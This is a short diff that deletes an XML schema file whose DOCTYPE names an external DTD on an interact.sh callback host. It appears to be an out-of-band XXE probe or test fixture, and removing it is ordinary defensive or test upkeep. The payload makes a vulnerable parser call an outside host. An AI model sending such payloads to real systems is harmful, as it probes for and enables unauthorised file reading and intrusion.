@@ -1,5 +1,0 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE note SYSTEM "https://caymjpj2vtc0000vj9tggfxkjmeyyyyyb.interact.sh?a=b&c=d">
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-    <xs:element name="PurchaseOrder" type="xs:string"></xs:element>
-</xs:schema>
